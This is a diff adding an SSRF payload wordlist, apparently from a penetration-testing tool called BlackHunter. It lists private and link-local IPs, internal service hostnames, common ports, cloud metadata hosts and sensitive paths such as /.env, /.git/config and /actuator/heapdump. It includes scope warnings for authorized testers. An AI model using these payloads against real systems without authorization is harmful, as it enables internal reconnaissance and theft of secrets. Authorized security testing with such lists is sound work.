@@ -1,0 +1,442 @@
+# ============================================================
+# BlackHunter — SSRF Payloads: Internal Network
+# ============================================================
+# Purpose : Test whether an application can be coerced into
+#           reaching internal/private hosts (RFC1918, CGNAT,
+#           link-local, and common internal service names).
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : One payload per line. Lines starting with '#' are comments.
+# Warning : These targets are typically outside the engagement
+#           scope. Only use them if the client explicitly included
+#           their internal network in the Rules of Engagement.
+# ============================================================
+
+# ------------------------------------------------------------
+# RFC1918 — Class A (10.0.0.0/8)
+# ------------------------------------------------------------
+http://10.0.0.1
+http://10.0.0.1:80
+http://10.0.0.1:443
+http://10.0.0.1:22
+http://10.0.0.1:8080
+http://10.0.0.1:8443
+http://10.0.0.2
+http://10.0.0.10
+http://10.0.0.100
+http://10.0.1.1
+http://10.0.1.10
+http://10.0.10.1
+http://10.1.1.1
+http://10.10.10.1
+http://10.10.10.10
+http://10.20.30.40
+http://10.100.0.1
+http://10.100.100.1
+
+# Common gateway / infra IPs in 10/8
+http://10.0.0.138        # common home router
+http://10.0.0.254
+http://10.0.1.254
+http://10.1.1.254
+http://10.10.0.1
+
+# ------------------------------------------------------------
+# RFC1918 — Class B (172.16.0.0/12)
+# ------------------------------------------------------------
+http://172.16.0.1
+http://172.16.0.1:80
+http://172.16.0.1:8080
+http://172.16.0.10
+http://172.16.1.1
+http://172.16.1.10
+http://172.16.10.1
+http://172.17.0.1          # Docker default bridge
+http://172.17.0.2          # First Docker container
+http://172.18.0.1
+http://172.18.0.2
+http://172.19.0.1
+http://172.19.0.2
+http://172.20.0.1
+http://172.20.0.2
+http://172.24.0.1
+http://172.28.0.1
+http://172.30.0.1
+http://172.31.0.1
+http://172.31.255.254
+
+# ------------------------------------------------------------
+# RFC1918 — Class C (192.168.0.0/16)
+# ------------------------------------------------------------
+http://192.168.0.1
+http://192.168.0.1:80
+http://192.168.0.1:443
+http://192.168.0.1:8080
+http://192.168.0.10
+http://192.168.0.100
+http://192.168.1.1          # very common home router
+http://192.168.1.1:8080
+http://192.168.1.10
+http://192.168.1.100
+http://192.168.1.254
+http://192.168.2.1
+http://192.168.10.1
+http://192.168.10.10
+http://192.168.100.1
+http://192.168.100.100
+http://192.168.122.1        # libvirt default bridge
+http://192.168.254.254
+
+# ------------------------------------------------------------
+# CGNAT / Shared Address Space (100.64.0.0/10)
+# ------------------------------------------------------------
+http://100.64.0.1
+http://100.64.0.1:80
+http://100.64.0.1:8080
+http://100.100.0.1
+http://100.100.100.1
+http://100.127.255.254
+
+# ------------------------------------------------------------
+# Link-local (169.254.0.0/16) — non-cloud-metadata uses
+# ------------------------------------------------------------
+http://169.254.0.1
+http://169.254.1.1
+http://169.254.169.254      # (see cloud_metadata.txt for full list)
+http://169.254.255.254
+
+# ------------------------------------------------------------
+# Loopback-adjacent (usually covered in localhost.txt)
+# ------------------------------------------------------------
+http://0.0.0.0
+http://0.0.0.0:80
+http://0.0.0.0:8080
+http://0.0.0.0:3000
+http://0.0.0.0:5000
+http://0.0.0.0:8000
+http://0.0.0.0:9000
+
+# ------------------------------------------------------------
+# Common internal hostnames (DNS)
+# ------------------------------------------------------------
+http://internal
+http://internal/
+http://internal.local
+http://internal.lan
+http://intranet
+http://intranet.local
+http://intranet.lan
+http://corp
+http://corp.local
+http://lan
+http://local
+http://home
+http://office
+
+# ------------------------------------------------------------
+# Service-oriented internal hostnames
+# ------------------------------------------------------------
+http://admin
+http://admin.local
+http://admin.internal
+http://administrator
+http://panel
+http://cpanel
+http://dashboard
+http://console
+http://manage
+http://management
+http://monitor
+http://monitoring
+http://status
+http://health
+http://metrics
+http://grafana
+http://kibana
+http://prometheus
+http://jenkins
+http://gitlab
+http://git
+http://git.internal
+http://ci
+http://cd
+http://build
+http://deploy
+http://registry
+http://docker
+http://docker.internal
+http://k8s
+http://kubernetes
+http://rancher
+http://nomad
+http://consul
+http://vault
+http://secrets
+http://config
+http://discovery
+
+# ------------------------------------------------------------
+# Database / cache internal hostnames
+# ------------------------------------------------------------
+http://db
+http://db.local
+http://db.internal
+http://database
+http://database.internal
+http://mysql
+http://mysql.internal
+http://postgres
+http://postgresql
+http://postgres.internal
+http://mssql
+http://oracle
+http://mongo
+http://mongodb
+http://redis
+http://redis.internal
+http://memcached
+http://elastic
+http://elasticsearch
+http://cassandra
+http://couchdb
+http://influxdb
+http://clickhouse
+http://neo4j
+
+# ------------------------------------------------------------
+# Auth / identity internal hostnames
+# ------------------------------------------------------------
+http://auth
+http://auth.internal
+http://sso
+http://sso.internal
+http://idp
+http://ldap
+http://ldap.internal
+http://ad
+http://dc
+http://dc01
+http://domain-controller
+http://keycloak
+http://okta
+http://oauth
+
+# ------------------------------------------------------------
+# Mail / messaging internal hostnames
+# ------------------------------------------------------------
+http://mail
+http://mail.internal
+http://smtp
+http://smtp.internal
+http://imap
+http://pop3
+http://exchange
+http://owa
+http://webmail
+http://mx
+
+# ------------------------------------------------------------
+# File / storage internal hostnames
+# ------------------------------------------------------------
+http://files
+http://files.internal
+http://file
+http://share
+http://shares
+http://nas
+http://san
+http://nfs
+http://smb
+http://ftp
+http://ftp.internal
+http://sftp
+http://minio
+http://s3
+http://storage
+http://backup
+http://backups
+
+# ------------------------------------------------------------
+# App / web internal hostnames
+# ------------------------------------------------------------
+http://app
+http://app.internal
+http://apps
+http://web
+http://web.internal
+http://webapp
+http://api
+http://api.internal
+http://api-v1
+http://api-v2
+http://gateway
+http://proxy
+http://reverse-proxy
+http://lb
+http://loadbalancer
+http://frontend
+http://backend
+http://worker
+http://queue
+http://rabbitmq
+http://kafka
+http://zookeeper
+
+# ------------------------------------------------------------
+# Common internal service ports (any host above)
+# ------------------------------------------------------------
+# Web / app
+:80
+:443
+:3000    # Node / Grafana / React dev
+:5000    # Flask / .NET
+:8000    # Django / FastAPI
+:8080    # Tomcat / Jenkins / general
+:8081
+:8443
+:8888    # Jupyter
+:9000    # Portainer / MinIO
+:9090    # Prometheus
+:9200    # Elasticsearch
+:9300
+:10000   # Webmin
+
+# Databases / caches
+:1433    # MSSQL
+:1521    # Oracle
+:3306    # MySQL
+:5432    # PostgreSQL
+:5984    # CouchDB
+:6379    # Redis
+:9042    # Cassandra
+:11211   # Memcached
+:27017   # MongoDB
+:27018
+:27019
+
+# Messaging / coordination
+:5672    # RabbitMQ
+:6379    # Redis
+:9092    # Kafka
+:2181    # Zookeeper
+:9411    # Zipkin
+
+# Directory / auth
+:389     # LDAP
+:636     # LDAPS
+:88      # Kerberos
+:3268    # Global Catalog
+
+# Remote access / management
+:22      # SSH
+:23      # Telnet
+:3389    # RDP
+:5900    # VNC
+:5985    # WinRM HTTP
+:5986    # WinRM HTTPS
+
+# Misc infra
+:2375    # Docker API (unencrypted)
+:2376    # Docker API (TLS)
+:4646    # Nomad
+:8500    # Consul
+:8200    # Vault
+:10250   # Kubelet
+:10255   # Kubelet (read-only)
+:6443    # Kubernetes API
+
+# ------------------------------------------------------------
+# Cloud-internal / provider-specific hostnames
+# ------------------------------------------------------------
+http://metadata.google.internal      # GCP
+http://metadata.microsoft.com        # Azure
+http://instance-data                 # AWS
+http://instance-data.ec2.internal    # AWS
+http://rancher-metadata              # Rancher
+http://kubernetes.default.svc        # K8s in-cluster
+http://kubernetes.default            # K8s short form
+
+# ------------------------------------------------------------
+# Docker / container network defaults
+# ------------------------------------------------------------
+http://host.docker.internal
+http://host.docker.internal:2375
+http://gateway.docker.internal
+http://docker.for.mac.host.internal
+http://docker.for.win.localhost
+
+# ------------------------------------------------------------
+# Common internal admin paths (pair with any host above)
+# ------------------------------------------------------------
+/admin
+/admin/
+/admin/login
+/administrator
+/manager/html        # Tomcat
+/manager/status
+/host-manager/html
+/console
+/console/login
+/jenkins
+/jenkins/login
+/actuator            # Spring Boot
+/actuator/health
+/actuator/env
+/actuator/heapdump
+/actuator/mappings
+/swagger-ui.html
+/swagger-ui/
+/api-docs
+/v2/api-docs
+/openapi.json
+/graphql
+/graphiql
+/phpmyadmin
+/pma
+/adminer
+/redis
+/redis-cli
+/.git/config
+/.env
+/.env.local
+/config.json
+/config.php
+/debug
+/debug/pprof
+/metrics
+/health
+/healthz
+/status
+/server-status       # Apache
+/server-info
+/nginx_status
+/.well-known/security.txt
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. Stay in scope. Internal network ranges are almost always
+#    OUT of scope for a standard external pentest. Only use
+#    these if the client's RoE explicitly includes internal
+#    hosts, and only from a position (VPN/jump host) they
+#    have authorized.
+#
+# 2. These payloads are most useful for:
+#    - Confirming blind SSRF via OOB (interactsh, Collaborator)
+#    - Mapping internal DNS resolution
+#    - Discovering internal admin panels exposed to the app
+#
+# 3. Don't brute-force the whole RFC1918 space. Target the
+#    specific hosts the client tells you about, or use a small
+#    curated list like this one.
+#
+# 4. The "service-oriented" hostnames are guesses. Use the
+#    client's asset inventory if available.
+#
+# 5. Watch response timing and error messages. A fast 200, a
+#    fast 404, and a slow timeout each tell you something
+#    different about the internal host.
+#
+# 6. If you reach an internal service, STOP and report it.
+#    Do not pivot, do not extract data, do not authenticate
+#    unless the RoE explicitly allows it.
+# ============================================================
